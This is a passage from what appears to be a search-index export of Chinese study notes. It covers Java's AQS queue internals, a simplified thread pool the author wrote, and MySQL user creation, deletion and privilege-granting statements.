<p>AQS\u672c\u8d28\u4e0a\u662f\u7528\u6765\u5bf9\u4e8e\u516c\u5171\u8d44\u6e90\u540c\u6b65\u7684\u6846\u67b6\uff08\u5bf9\u4e8e\u540c\u6b65\u8fc7\u7a0b\u7684\u62bd\u8c61\uff09\uff0cLock\u5c31\u662f\u57fa\u4e8e\u5b83\u6765\u505a\u7684\uff08Lock\u5e76\u6ca1\u6709\u76f4\u63a5\u7ee7\u627fAQS\uff0c\u800c\u662f\u4f7f\u7528\u7ee7\u627f\u4e86AQS\u7684Sync\u5b9e\u73b0\u540c\u6b65\u7684\uff09\uff0c\u4f8b\u5982\u73b0\u5728\u7684\u4e00\u4e2a\u8f93\u51fa\u5230\u65e5\u5fd7\u7684\u670d\u52a1\u662f\u9700\u8981\u4f7f\u7528\u516c\u5171\u8d44\u6e90\uff08Printer\uff09\u7684\uff0c\u5982\u679c\u4e0d\u9002\u7528AQS\uff0c\u6211\u4eec\u4e00\u822c\u5c31\u662f\u5728\u4f7f\u7528\u8d44\u6e90\u7684\u65f6\u5019\u52a0\u4e0asynchronized\u5173\u952e\u5b57\uff0c\u4f46\u662f\u8fd9\u6837\u5b50\u5e26\u6765\u7684\u6027\u80fd\u5f00\u9500\u592a\u5927\u4e86\uff0c\u540c\u65f6\u6a21\u5f0f\u4e5f\u662f\u56fa\u5b9a\u7684\uff0c\u65e0\u6cd5\u81ea\u5b9a\u4e49\u529f\u80fd\uff08\u6bd4\u5982\u73b0\u5728\u8fd9\u4e2a\u670d\u52a1\u7528\u4e0d\u4e86\u88ab\u5360\u7528\u7684\u60c5\u51b5\u4e0b\uff0c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5148\u53bb\u505a\u522b\u7684\u4e8b\u60c5\uff0c\u5728\u4e0d\u5f71\u54cd\u6267\u884c\u6b63\u786e\u6027\u7684\u60c5\u51b5\u4e0b\uff09\u3002\u800cAQS\u4e3b\u8981\u89e3\u51b3\u7684\u5c31\u662f\u7ebf\u7a0b\u95f4\u540c\u6b65\u95ee\u9898\u3002</p> </li> <li> <p>AQS\u5168\u7a0bAbstract Queue Synchronized\uff0c\u5176\u4e2d</p> </li> <li> <p>Abstract\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u652f\u6301\u6269\u5c55\u7684\u5f00\u653e\u6027\u6846\u67b6</p> </li> <li>Queue\u8868\u793a\u5176\u672c\u8d28\u4e0a\u662f\u4f7f\u7528\u961f\u5217\u7684\u65b9\u5f0f\u5bf9\u4e8e\u7ebf\u7a0b\u8fdb\u884c\u7ba1\u7406\uff08\u7c7b\u4f3c\u4e8e\u6392\u961f\uff09</li> <li> <p>Synchronized\u8868\u793a\u5b83\u7684\u76ee\u7684\u662f\u65f6\u7ebf\u7a0b\u76f4\u63a5\u5b9e\u73b0\u540c\u6b65\u3002</p> </li> <li> <p>AQS\u6700\u6838\u5fc3\u7684\u8bbe\u8ba1\u5c31\u662f\u5728\u4e8e\u540c\u6b65\u961f\u5217\u7684\u7ba1\u7406\uff0c\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u8fdb\u5165\u961f\u5217\u65f6\u4f1a\u88ab\u5305\u88c5\u6210Node\uff0c\u6211\u4eec\u6765\u770b\u770bNode\u7684\u6e90\u7801</p> </li> </ul> <pre><code>static final class Node {\n    static final Node SHARED = new Node();    // \u76f8\u5f53\u4e8e\u4e00\u4e2a\u6807\u8bb0\uff0c\u5e76\u6ca1\u6709\u5b9e\u9645\u7684\u4f5c\u7528\uff0c\u5171\u4eab\u9501\u6807\u8bb0\n    static final Node EXCLUSIVE = null;       // \u540c\u4e0a\uff0c\u6392\u5b83\u9501\u6807\u8bb0\n    static final int CANCELLED =  1;      // \u5728\u7ebf\u7a0b\u6392\u961f\u7b49\u5f85\u7684\u65f6\u5019\u4e0d\u60f3\u7b49\u4e86\uff0c\u4e5f\u5c31\u662f\u4ece\u961f\u5217\u4e2d\u5254\u9664\n    static final int SIGNAL    = -1;      // \u4e0b\u4e00\u4e2a\u7ebf\u7a0b\u9700\u8981\u88ab\u5524\u9192\n                                          //\uff08\u5982\u679c\u961f\u5217\u4e2d\u7684\u7ebf\u7a0b\u88ab\u6302\u8d77\uff0c\u4f1a\u5c06\u4e0a\u4e00\u4e2a\u7ebf\u7a0b\u7684\u72b6\u6001\u8bbe\u7f6e\u4e3a-1\uff0c\u4e0a\u4e00\u4e2a\u7ebf\u7a0b\u9700\u8981\u5524\u9192\u4e0b\u4e00\u4e2a\u7ebf\u7a0b\uff09\n    static final int CONDITION = -2;      \n    static final int PROPAGATE = -3;\n\n    volatile int waitStatus;              // \u7b49\u5f85\u7684\u72b6\u6001\uff0c\u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u90a3\u4e9b\u503c\uff0c\u4e00\u822c\u901a\u8fc7CAS\u7684\u65b9\u5f0f\u4fee\u6539\uff0c\u9ed8\u8ba4\u662f0\n\n    volatile Node prev;       // \u524d\u9a71\u8282\u70b9\n    volatile Node next;       // \u540e\u7ee7\u7ed3\u70b9             \n\n    volatile Thread thread;   // \u4ee3\u8868\u7684\u7ebf\u7a0b\uff0c\u6ce8\u610f\uff1a\u961f\u5217\u5934\uff08head\uff09\u7684thread\u4e00\u5b9a\u4e3anull(\u5728\u5934\u7ed3\u70b9\u5f97\u5230\u9501\u8d44\u6e90\u65f6\u4f1a\u5c06Node\u8bbe\u7f6e\u4e3anull\uff0c\u5e2e\u52a9GC\u56de\u6536)\n    Node nextWaiter;      \n    // \u83b7\u53d6\u9501\u7684\u72b6\u6001\uff0c\u6392\u4ed6\u6216\u8005\u5171\u4eab\uff0c\u5f53\u7136\u4e5f\u6709\u53ef\u80fd\u65f6\u6761\u4ef6\u7b49\u5f85\uff0c\u6761\u4ef6\u7b49\u5f85\u7684\u65f6\u5019\u5c31\u53c8\u8fd9\u4e2aNode\u5c31\u6709\u7279\u6b8a\u610f\u4e49\u4e86\uff08\u4e0d\u518d\u662f\u4e00\u4e2a\u6807\u8bb0\uff09\n    // \u8fd9\u91cc\u7701\u53bb\u4e86\u65b9\u6cd5\uff0c\u56e0\u4e3a\u65b9\u6cd5\u5c31\u662f\u4e00\u4e9b\u7b80\u5355\u7684\u903b\u8f91\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u5b57\u6bb5\u4f53\u73b0\n}\n</code></pre> <p>\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f\uff0c\u5728JDK19\u7684\u6e90\u7801\u4e2d\uff0c\u65b0\u589e\u52a0\u4e86\u51e0\u4e2a\u7c7b\u7ee7\u627fNode,\u800cNode\u53d8\u6210\u4e86\u4e00\u4e2a\u62bd\u8c61\u7c7b</p> <p></p> <p>\u521a\u597d\u5bf9\u5e94\u7740\u9501\u7684\u51e0\u79cd\u72b6\u6001\u3002\u5e76\u4e14Node\u7684\u5185\u90e8\u7ed3\u6784\u5df2\u6539\u4e86\uff0c\u4e5f\u5c31\u662fnextWaiter\u5220\u6389\u4e86\uff0c\u76f4\u63a5\u7528\u7c7b\u578b\u5224\u65ad\u3002</p> <p>\u5e76\u4e14JDK19\u4e2d\u8fd8\u6539\u53d8\u4e86\u90a3\u4e9b\u6807\u8bb0\u7684int\u503c\uff0c\u4f7f\u5176\u53ef\u4ee5\u5171\u5b58\uff08\u901a\u8fc7bitmap\u7684\u5f62\u5f0f\uff09</p> <ul> <li> <p>JDK\u4e2d\u5927\u90e8\u5206\u961f\u5217\u90fd\u662f\u901a\u8fc7Node\u8282\u70b9\u7684\u65b9\u5f0f\u6784\u5efa\u7684\uff0c\u7136\u540e\u901a\u8fc7head\u548ctail\u8fdb\u884c\u8bbf\u95ee\u3002AQS\u4e5f\u4e0d\u4f8b\u5916</p> </li> <li> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u770b\u770bAQS\u5bf9\u4e8e\u961f\u5217\u7684\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\uff08\u5165\u961f\uff0c\u51fa\u961f\uff09</p> </li> <li> <p>\u5165\u961f</p> <pre><code>private Node enq(final Node node) {\n    for (;;) {\n        Node t = tail;\n        if (t == null) {    // \u9700\u8981\u521d\u59cb\u5316\u7684\u60c5\u51b5\n            if (compareAndSetHead(new Node()))\n                tail = head;\n        } else {            // \u5df2\u7ecf\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u6dfb\u52a0\u8282\u70b9\uff0c\u4f46\u662f\u8282\u70b9\u4e0d\u4e00\u5b9a\u6dfb\u52a0\u6210\u529f\n            node.prev = t;                      // \u5148\u4fee\u6539\u81ea\u5df1\u8282\u70b9\u7684\u6307\u6b63\n            if (compareAndSetTail(t, node)) {   // CAS\u4fee\u6539\u5c3e\u6307\u9488\uff0c\u5982\u679c\u6210\u529f\uff0c\u5219\u5c06\u524d\u4e00\u4e2a\u8282\u70b9\u7684\u540e\u7ee7\u4fee\u6539\u6307\u5411\u81ea\u5df1\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u81ea\u65cb\n                t.next = node;\n                return t;\n            }\n        }\n    }\n}\n\nprivate Node addWaiter(Node mode) {\n    Node node = new Node(Thread.currentThread(), mode);\n    Node pred = tail;\n    if (pred != null) {     // \u5982\u679c\u4e0d\u9700\u8981\u521d\u59cb\u5316,\u5219\u5c1d\u8bd5\u76f4\u63a5\u6dfb\u52a0\uff0c\u4f46\u662f\u6dfb\u52a0\u4e5f\u6709\u53ef\u80fd\u5931\u8d25\uff0c\u5931\u8d25\u7684\u8bdd\u8fdb\u5165\u81ea\u65cb\u6dfb\u52a0\n        node.prev = pred;   \n        if (compareAndSetTail(pred, node)) {\n            pred.next = node;\n            return node;\n        }\n    }\n    enq(node);      // \u81ea\u65cb\u6dfb\u52a0\n    return node;\n}\n</code></pre> </li> <li> <p>\u51fa\u961f</p> <pre><code>private void cancelAcquire(Node node) {\n    // \u4e3a\u7a7a\u5219\u4e0d\u5904\u7406\n    if (node == null)\n        return;\n    node.thread = null;\n    // \u524d\u9a71\u6307\u9488\u5df2\u77e5\u5f80\u524d\u627e\uff0c\u76f4\u5230\u627e\u5230waitStatus\u4e0d\u662fCancle\u7684\u8282\u70b9\n    Node pred = node.prev;\n    while (pred.waitStatus &gt; 0)\n        node.prev = pred = pred.prev;\n    // \u524d\u9a71\u7684\u540e\u7ee7\u6307\u9488\u76f4\u63a5\u5f80\u4e0b\u79fb\u52a8\u4e00\u4f4d\uff0c\u8fd9\u91cc\u6709\u4e2a\u95ee\u9898\uff0c\u4e3a\u4ec0\u4e48\u9700\u8981\u518d\u72b6\u6001\u53d8\u6210cancle\u524d\u8bb0\u5f55\uff0c\u800c\u4e14\u540e\u9762\u8fd8\u9700\u8981cas\u4fee\u6539\u5462\uff1f\n    // \u7b54\uff1a\u5047\u8bbe\u60c5\u51b5\uff1aT1\u53d6\u6d88N2\uff0cT2\u53d6\u6d88N3   N1&lt;--N2&lt;--N3&lt;--N4\n    //    \u6b64\u65f6N2\u5982\u679c\u5148\u8bbe\u4e3aCancle\uff0cT2\u5c31\u4f1a\u76f4\u63a5\u6539\u53d8N1\u7684next\u5230N4\uff0c\u800cT1\u5982\u679c\u6ca1\u6709CAS\u7684\u8bdd\uff0c\u53c8\u4f1a\u5c06N1\u7684next\u6539\u4e3aN3\n    Node predNext = pred.next;\n    // \u76f4\u63a5\u8bbe\u7f6e\u5f53\u524d\u8282\u70b9\u7684\u72b6\u6001\n    node.waitStatus = Node.CANCELLED;\n    // \u5982\u679c\u53d6\u6d88\u7684\u8282\u70b9\u662f\u5c3e\u8282\u70b9\uff0c\u5219\u76f4\u63a5\u5c06\u524d\u9a71\u7684\u540e\u7ee7\u8bbe\u7f6e\u4e3anull\n    if (node == tail &amp;&amp; compareAndSetTail(node, pred)) {\n        compareAndSetNext(pred, predNext, null);\n    } else {\n        // \u5982\u679c\u540e\u7ee7\u9700\u8981\u88ab\u5524\u9192\uff0c\u6539\u53d8\u524d\u9a71\u7684waitStatus\n        int ws;\n        if (pred != head &amp;&amp;\n            ((ws = pred.waitStatus) == Node.SIGNAL ||\n             (ws &lt;= 0 &amp;&amp; compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) &amp;&amp;\n            pred.thread != null) {\n            Node next = node.next;\n            if (next != null &amp;&amp; next.waitStatus &lt;= 0)\n                compareAndSetNext(pred, predNext, next);\n        } else {            // \u5982\u679c\u662f\u5934\u7ed3\u70b9\uff0c\u76f4\u63a5\u4ece\u6302\u8d77\u72b6\u6001\u53d8\u6210\u5c31\u7eea\u72b6\u6001\n            unparkSuccessor(node);\n        }\n        node.next = node;   // \u81ea\u5df1\u6307\u5411\u81ea\u5df1\uff0c\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5e2e\u52a9GC\u56de\u6536\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3anull\uff0c\u4ed6\u4ecd\u7136\u6709\u53ef\u80fd\u4e0d\u88ab\u56de\u6536\n    }\n}\n</code></pre> <p>\u5728JDK19\u4e2d<code>cancelAcquire()</code>\u88ab\u91cd\u65b0\u8c03\u6574\uff0c\u5177\u4f53\u53ef\u89c1\u6e90\u7801\u3002</p> <p>Doug Lea\u7684\u4ee3\u7801\u5b9e\u5728\u662f\u592a\u7cbe\u5999\u4e86\uff0c\u80fd\u628a\u591a\u7ebf\u7a0b\u4e4b\u95f4\u7684\u540c\u6b65\u95ee\u9898\u5904\u7406\u7684\u8fd9\u4e48\u725b\u903c\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ece\u4e2d\u603b\u7ed3\u7ecf\u9a8c\uff1a</p> <ul> <li>\u5bf9\u4e8e\u591a\u7ebf\u7a0b\u4e0b\u4fdd\u8bc1\u5b89\u5168\u7684\u95ee\u9898\uff0c\u5148\u4fee\u6539\u81ea\u8eab\uff08\u53ea\u6709\u5f53\u524d\u7ebf\u7a0b\u53ef\u4ee5\u63a5\u89e6\u5230\u7684\u5bf9\u8c61\uff09\uff0c\u628a\u51c6\u5907\u5de5\u4f5c\u505a\u597d\u3002\u8fbe\u5230\u300a\u4e00\u65e6\u4fee\u6539\u4e86\u516c\u5171\u5bf9\u8c61\uff0c\u5c31\u5df2\u7ecf\u5b8c\u6210\u64cd\u4f5c\u300b\u7684\u5730\u6b65</li> <li>\u5728\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\uff0c\u5c31\u9700\u8981\u5bf9\u516c\u5171\u53d8\u91cf\u8fdb\u884c\u4fee\u6539\u4e86\uff0c\u5982\u679c\u4e3a\u4e86\u4fdd\u8bc1\u7ebf\u7a0b\u540c\u6b65\uff0c\u8981\u52a0\u9501\uff0c\u52a0\u4e50\u89c2\u9501\u6216\u8005\u60b2\u89c2\u9501\u90fd\u53ef\u4ee5\uff0c\u91cd\u70b9\u662f\u5bf9\u8c01\u52a0\u9501\uff0c\u539f\u5219\u662f\uff0c\u5148\u5bf9\u4f5c\u7528\u57df\u66f4\u5e7f\u3001\u53ef\u53d8\u6027\u66f4\u5c0f\u7684\u5bf9\u8c61\u52a0\u9501\uff0c\u4fdd\u8bc1\u9501\u4e0a\u7684\u6b7b\u6b7b\u7684</li> <li>\u5bf9\u4e8e\u540c\u4e00\u64cd\u4f5c\u7684\u591a\u7ebf\u7a0b\u540c\u6b65\u4e3a\u9898\uff0c\u505a\u5230\uff0c\u4e0d\u52a8\u5219\u5df2\uff0c\u4e00\u52a8\u5219\u6210\uff0c\u4e5f\u5c31\u662f\u4e00\u5f00\u59cb\u7684\u4fee\u6539\u4e0d\u8981\u5f71\u54cd\u5176\u4ed6\u7ebf\u7a0b\u5728\u6267\u884c\u524d\u9762\u4ee3\u7801\u7684\u60c5\u51b5\uff0c\u4e00\u65e6\u4fee\u6539\u5c31\u8981\u5b8c\u6210\u6240\u6709\u64cd\u4f5c\u3002</li> </ul> <p>\u5f53\u7136\uff0c\u6700\u91cd\u8981\u7684\u662f\u591a\u5b9e\u8df5\uff0c\u5b9e\u8df5\u51fa\u771f\u77e5\uff0c\u4e0a\u9762\u7684\u603b\u7ed3\u53ea\u80fd\u4f5c\u4e3a\u53c2\u8003\uff0c\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790</p> </li> <li></li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#3","title":"3. \u7ebf\u7a0b\u6c60","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_22","title":"\u521d\u63a2\u7ebf\u7a0b\u6c60","text":"<p>\u7ebf\u7a0b\u6c60\u7a76\u7adf\u662f\u5982\u4f55\u7ebf\u7a0b\u4e00\u4e2a\u5728\u6709\u9650\u7684\u7ebf\u7a0b\u5185\u6267\u884c\u591a\u4e2a\u4efb\u52a1\u7684\u5462\uff1f\u4e5f\u5c31\u662f\u8bf4\u4ed6\u662f\u5982\u4f55\u5b9e\u73b0\u7ebf\u7a0b\u590d\u7528\u7684\u5462\uff1f\u867d\u7136\u4e4b\u524d\u5df2\u77e5\u6709\u7591\u60d1\uff0c\u4f46\u662f\u5b66\u4e60\u4e4b\u540e\u53d1\u73b0\u672c\u8d28\u5f88\u7b80\u5355\uff08\u7ec6\u8282\u5f88\u590d\u6742\uff09\u3002</p> <p>\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u8c03\u7528Runnable#run()\u5e76\u4e0d\u4f1a\u5f00\u542f\u4e00\u4e2a\u884c\u7684\u7ebf\u7a0b\uff0c\u60f3\u8981\u5f00\u542f\u4e00\u4e2a\u9700\u8981\u4f7f\u7528Thread#start()\u3002\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\uff1a</p> <pre><code>public class ThreadPool {\n    public final int maxThread;\n    public final int coreThread;\n    public volatile boolean running = true;\n    public ArrayList&lt;Runnable&gt; runnables = new ArrayList&lt;Runnable&gt;();\n    public ArrayList&lt;Worker&gt; workers = new ArrayList&lt;Worker&gt;();\n    class Worker extends Thread {\n\n        @Override\n        public void run() {\n            while (running) {\n                while (!runnables.isEmpty() &amp;&amp; running) {\n                    Runnable runnable = runnables.get(0);\n                    runnables.remove(0);\n                    if (runnable == null) {\n                        continue;\n                    }\n                    runnable.run();\n                } while (runnables.isEmpty() &amp;&amp; running) {\n                    Thread.yield();\n                }\n            }\n        }\n    }\n    public ThreadPool(int maxThread, int coreThread) {\n        this.maxThread = maxThread;\n        this.coreThread = coreThread;\n    }\n    public Runnable submit(Runnable runnable) {\n        if (workers.size() &gt;= coreThread) {\n            if (runnables.size() &gt;= maxThread) {\n                return runnable;\n            } else {\n                runnables.add(runnable);\n            }\n        } else {\n            runnables.add(runnable);\n            Worker worker = new Worker();\n            workers.add(worker);\n            worker.start();\n        }\n        return runnable;\n    }\n}\n</code></pre> <p>\u8fd9\u662f\u6211\u81ea\u5df1\u5199\u7684\u4e00\u4e2a\u8d85\u7ea7\u5220\u51cf\u7248\u7684\u7ebf\u7a0b\u6c60\uff0c\u4ed6\u53ea\u662f\u80fd\u5b9e\u73b0\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\u591a\u4e2a\u4efb\u52a1\u7684\u60c5\u51b5\u3002\u5176\u5b9e\u5c31\u662f\u7ed9\u4e00\u4e2a\u4efb\u52a1\u5217\u8868\uff0c\u65b0\u5efa\u51e0\u4e2a\u7ebf\u7a0b\uff08\u5de5\u4eba\uff09\uff0c\u7ebf\u7a0b\u4e0d\u505c\u4ece\u7ebf\u7a0b\u6c60\u90a3\u95ee\u6709\u6ca1\u6709\u4efb\u52a1\uff0c\u6709\u4efb\u52a1\u5c31\u628a\u4efb\u52a1\u63a5\u4e0b\u6765\uff0c\u7ebf\u7a0b\u6c60\u4e5f\u4ece\u81ea\u5df1\u7684\u4efb\u52a1\u5217\u8868\u4e2d\u5c06\u5176\u5220\u9664\u3002\u7136\u540e\u7ebf\u7a0b\u8c03\u7528\u4efb\u52a1\u7684<code>run()</code>\u65b9\u6cd5\u3002</p> <p>\u6211\u4eec\u5728\u4f7f\u7528\u8fd9\u4e2a\u7b80\u6613\u7248\u7684\u7ebf\u7a0b\u6c60\u7684\u65f6\u5019\u4f1a\u53d1\u73b0\u51e0\u4e2a\u95ee\u9898\uff1a</p> <ol> <li> <p>\u7ebf\u7a0b\u6c60\u7684\u5927\u5c0f\u5982\u4f55\u63a7\u5236\uff08\u7ebf\u7a0b\u6c60\u9700\u8981\u63a7\u5236\u4efb\u52a1\u7684\u6570\u91cf\u548c\u4efb\u52a1\u7684\u5206\u914d\u60c5\u51b5\uff09</p> </li> <li> <p>\u7ebf\u7a0b\u6c60\u7684\u5e76\u53d1\u5b89\u5168\u6027\u95ee\u9898\uff08\u591a\u4e2a\u7ebf\u7a0b\u5171\u4eab\u4efb\u52a1\u5217\u8868\uff09</p> </li> <li> <p>\u7ebf\u7a0b\u53d1\u751f\u5f02\u5e38\u65f6\u7684\u5f02\u5e38\u5982\u4f55\u5904\u7406\uff08\u9ed8\u8ba4\u7684\u4e0d\u5904\u7406\u4f1a\u76f4\u63a5\u5bfc\u81f4\u7ebf\u7a0b\u7ec8\u6b62\uff09</p> </li> </ol> <p>\u2026</p> <p>\u8fd9\u5c31\u662f\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u5b66\u4e60\u7684\u7ebf\u7a0b\u6c60\u9501\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\u3002</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/","title":"MySql\u5b66\u4e60","text":""},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_1","title":"\u57fa\u7840","text":""},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#1-dcl","title":"1. DCL\u8bed\u53e5","text":"<p>DCL\u8bed\u53e5\u4e3b\u8981\u7528\u6765\u5bf9\u4e8e\u6570\u636e\u63a7\u670d\u52a1\u5c42\u7684\u8fde\u63a5\u548c\u6743\u9650\u63a7\u5236,\u5176\u64cd\u4f5c\u7684\u6570\u636e\u5e93\u4e3a\u7cfb\u7edf\u6570\u636e\u5e93(MySql);</p> <ul> <li>\u521b\u5efa\u7528\u6237</li> </ul> <pre><code>create user 'xxx'@'host' identified by 'password';\n</code></pre> <ul> <li> <p>xxx:\u7528\u6237\u540d,\u53ef\u4ee5\u81ea\u5b9a\u4e49,\u53ef\u4ee5\u91cd\u540d.</p> </li> <li> <p>host:\u4e3b\u673aip\u5730\u5740,\u53ef\u4ee5\u7701\u7565(\u5373<code>create user xxx identified by 'password'</code>);,\u7701\u7565\u662f\u9ed8\u8ba4\u4e3a%,\u5373\u4efb\u610f\u4e3b\u673a.</p> </li> <li> <p>\u4f46\u662f\u7528\u6237\u540d\u548cip\u5730\u5740\u7ec4\u5408\u8d77\u6765\u4e0d\u80fd\u91cd\u590d,\u4e5f\u5c31\u662f\u53ea\u7528\u5f53\u7528\u6237\u540d\u548cip\u5730\u5740\u76f8\u540c\u662f\u624d\u88ab\u8ba4\u4e3a\u662f\u540c\u4e00\u4e2a\u7528\u6237.</p> </li> <li> <p><code>identified by \u2018password\u2019</code>:\u8fd9\u4e00\u6bb5\u662f\u7528\u6765\u8bbe\u7f6e\u5bc6\u7801\u7684,\u53ef\u4ee5\u7701\u7565,\u7701\u7565\u7684\u8bdd\u5219\u6ca1\u6709\u5bc6\u7801,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528<code>mysql -uxxx</code>\u767b\u5f55.</p> </li> <li> <p>password:\u5bc6\u7801,\u8bbe\u7f6e\u5bc6\u7801\u53ef\u80fd\u4f1a\u6536\u5230\u4e00\u4e9b\u9650\u5236(\u4e00\u822c\u51fa\u73b0\u5728linux_mysql\u4e2d,\u4f1a\u5bf9\u4e8e\u5bc6\u7801\u6709\u590d\u6742\u5ea6\u68c0\u6d4b,</p> <p>validate_password\u662f\u4e00\u4e2a\u5bc6\u7801\u68c0\u6d4b\u7684\u63d2\u4ef6,\u5728linux\u4e0a\u9ed8\u8ba4\u5b89\u88c5,\u800c\u5728windows\u4e0a\u5219\u9ed8\u8ba4\u4e0d\u5b89\u88c5.</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>select * from mysql.plugin</code>\u6216\u8005<code>SHOW PLUGINS;</code>\u67e5\u770b\u662f\u6240\u6709\u5df2\u5b89\u88c5\u7684\u63d2\u4ef6.</p> <p>windows\u4e0b\u7684\u5b89\u88c5\u8bed\u53e5<code>INSTALL PLUGIN validate_password SONAME 'validate_password.dll';</code></p> <p>linux\u4e0b\u7684\u5b89\u88c5\u8bed\u53e5<code>INSTALL PLUGIN validate_password SONAME 'validate_password.so';</code></p> <p>\u5378\u8f7d\u8bed\u53e5<code>UNINSTALL PLUGIN validate_password;</code></p> <p>ref: Linux \u914d\u7f6eMySQL\u5bc6\u7801\u590d\u6742\u5ea6</p> </li> <li> <p>\u5220\u9664\u7528\u6237</p> </li> </ul> <pre><code>drop user 'xxx'@'host';\n</code></pre> <ul> <li>xxx:\u7528\u6237\u540d</li> <li>host:\u4e3b\u673aip\u5730\u5740,\u53ef\u4ee5\u7701\u7565,\u7701\u7565\u662f\u9ed8\u8ba4\u4e3a%.</li> </ul> <pre><code>delete from mysql.user where user='xxx' and host = 'host';\n</code></pre> <ul> <li> <p>\u8fd9\u79cd\u65b9\u5f0f\u662f\u76f4\u63a5\u64cd\u4f5c\u7cfb\u7edf\u7684\u6570\u636e\u8868.</p> </li> <li> <p>\u7528\u6237\u6388\u6743</p> </li> </ul> <p>\u7528\u6237\u521b\u5efa\u4e4b\u540e\u9ed8\u8ba4\u662f\u6ca1\u6709\u4efb\u4f55\u6743\u9650\u7684,\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\u67e5\u770b\u7528\u6237\u7684\u6743\u9650,user\u548chost\u4e3a\u7528\u6237\u540d\u548c\u5730\u5740.\u7701\u7565\u60c5\u51b5\u540c\u4e0a.</p> <pre><code>show grants for user@host;\n</code></pre> <p>\u5bf9\u4e8e\u521a\u521b\u5efa\u7684\u7528\u6237,\u67e5\u770b\u6743\u9650\u662f\u53ef\u4ee5\u770b\u5230</p> <pre><code>mysql&gt; show grants for lee@localhost;\n+-----------------------------------------+\n| Grants for lee@localhost                |\n+-----------------------------------------+\n| GRANT USAGE ON *.* TO `lee`@`localhost` |\n+-----------------------------------------+\n</code></pre> <ol> <li> <p>\u7528\u6237\u6388\u6743</p> <pre><code>GRANT privileges ON databasename.tablename TO 'username'@'host';\n</code></pre> <ul> <li>privileges \u2013 \u7528\u6237\u7684\u64cd\u4f5c\u6743\u9650,\u5982SELECT , INSERT , UPDATE  \u7b49.\u5982\u679c\u8981\u6388\u4e88\u6240 \u7684\u6743\u9650\u5219\u4f7f\u7528ALL\u8bf4\u660e: </li> </ul> \u6743\u9650\u540d \u63cf\u8ff0 ALL \u5141\u8bb8\u6240\u7528\u6743\u9650 ALTER \u5141\u8bb8\u4f7f\u7528ALTER TABLE ALTER ROUTINE \u5141\u8bb8\u66f4\u6539\u5b58\u50a8\u4f8b\u7a0b CREATE \u5141\u8bb8\u4f7f\u7528CREATE TABLE CREATE ROUTINE \u5141\u8bb8\u521b\u5efa\u5b58\u50a8\u4f8b\u7a0b CREATE TEMPORARY TABLE \u5141\u8bb8\u521b\u5efa\u4e34\u65f6\u8868(with\u8bed\u53e5) CREATE USER \u5141\u8bb8\u65b0\u5efa\u7528\u6237 CREATE VIEW \u5141\u8bb8\u521b\u5efaview DELETE \u5141\u8bb8\u4f7f\u7528DELETE DROP \u5141\u8bb8\u7528\u6237\u4f7f\u7528DROP TABLE EXECUTE \u5141\u8bb8\u7528\u6237\u8fd0\u884c\u5b58\u50a8\u7684\u4f8b\u7a0b FILE \u5141\u8bb8\u4f7f\u7528SELECT\u2026INFILE\u548cLOAD DATA INFILE INDEX \u5141\u8bb8\u4f7f\u7528CREATE INDEX\u548cDROP INDEX INSERT \u5141\u8bb8\u4f7f\u7528INSERT LOCK TABLES \u5141\u8bb8\u5bf9\u7528\u6237\u8fd8\u5177\u6709SELECT\u6743\u9650\u7684\u8868\u4f7f\u7528LOCK TABLES PROCESS \u5141\u8bb8\u4f7f\u7528SHOW FULL PROCESSLIST RELOAD \u5141\u8bb8\u4f7f\u7528FLUSH\u7f13\u5b58 REPLICATION MySQL Replication,\u4e3b\u4ece\u540c\u6b65( Master-Slave) REPLICATION SLAVE MySQL Replication,\u4e3b\u4ece\u540c\u6b65( Master-Slave) SELECT \u5141\u8bb8\u4f7f\u7528select\u8bed\u53e5 SHOW DATABASES \u5141\u8bb8\u67e5\u770b\u6570\u636e\u5e93(schema) SHOW VIEW \u5141\u8bb8\u4f7f\u7528<code>show create view</code>\u8bed\u53e5 SHUTDOWN \u5141\u8bb8\u5173\u95edmysql\u670d\u52a1\u7aef SUPER \u5141\u8bb8\u4f7f\u7528CHANGE MASTER\u3001KILL\u3001PURGE MASTER LOGS\u548cSET GLOBAL SQL\u8bed\u53e5\u3002\u5141\u8bb8debug\u547d\u4ee4\u3002\u5982\u679c\u8fbe\u5230\u6700\u5927\u8fde\u63a5\u6570\uff0c\u5219\u5141\u8bb8\u8fdb\u884c\u4e00\u4e2a\u989d\u5916\u8fde\u63a5\u3002 UPDATE \u5141\u8bb8\u5bf9\u8868\u4e2d\u6570\u636e\u66f4\u65b0 USAGE \u53ea\u80fd\u8fde\u63a5,\u6ca1\u6709\u4efb\u4f55\u6743\u9650,\u8fd9\u5c31\u662f\u521d\u59cb\u521b\u5efa\u7684\u7528\u6237\u7684\u60c5\u51b5 <ul> <li> <p>databasename \u2013  \u6570\u636e\u5e93\u540d,*\u8868\u793a\u6240\u6709</p> </li> 